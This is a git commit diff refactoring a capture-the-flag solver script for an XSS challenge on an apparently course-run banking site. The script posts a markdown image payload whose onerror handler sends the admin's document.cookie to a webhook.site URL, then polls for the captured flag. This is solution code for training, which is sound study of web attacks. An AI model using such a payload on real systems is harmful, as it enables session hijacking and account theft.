d119df140528f530a1f6487a3c1ccc0b2fa8b931
SAW <99191294+nicsaw@users.noreply.github.com>
2025-05-14 02:30:21 +1000

    NetQuocca 2: simplify

--- ctf/4-XSS/netquocca_2.py
+++ ctf/4-XSS/netquocca_2.py
@@ -1,27 +1,12 @@
 import sys
 from pathlib import Path
 sys.path.append(str(Path(__file__).resolve().parent.parent))
-from utils import get_session, find_flag
+from utils import get_session, WebhookSite
 
 class Solver:
     def __init__(self):
         self.session = get_session()
-        self.webhooksite_uuid = self.get_webhooksite_uuid()
-        self.webhooksite_url = f"https://webhook.site/{self.webhooksite_uuid}"
-        self.webhooksite_view_url = f"https://webhook.site/#!/view/{self.webhooksite_uuid}"
-        self.webhooksite_requests_url = f"https://webhook.site/token/{self.webhooksite_uuid}/requests"
-
-    def get_webhooksite_uuid(self):
-        response = self.session.post("https://webhook.site/token")
-        return response.json()["uuid"]
-
-    def find_flag_webhooksite(self, delay_seconds=3):
-        import time, json
-        time.sleep(delay_seconds)
-        response = self.session.get(self.webhooksite_requests_url)
-        response_json = response.json()
-        response_json_text = json.dumps(response_json, indent=2)
-        find_flag(response_json_text)
+        self.webhooksite = WebhookSite()
 
     def main(self):
         API_BASE_URL = "https://api.netquocca.quoccacorp.com"
@@ -34,7 +19,7 @@ class Solver:
         ADMIN_ACCOUNT_NUMBER = "00000000"
 
         # No spaces allowed
-        PAYLOAD = f'''![x]("onerror="fetch(`{self.webhooksite_url}?q=${{document.cookie}}`))'''
+        PAYLOAD = f'''![x]("onerror="fetch(`{self.webhooksite.url}?q=${{document.cookie}}`))'''
 
         self.session.post(f"{API_BASE_URL}/transactions", json={
             "from_account": { "bsb": my_bsb, "account_number": my_account_number },
@@ -43,7 +28,7 @@ class Solver:
             "amount": 0.01
         })
 
-        self.find_flag_webhooksite()
+        self.webhooksite.find_flags()
 
 if __name__ == "__main__":
     Solver().main()
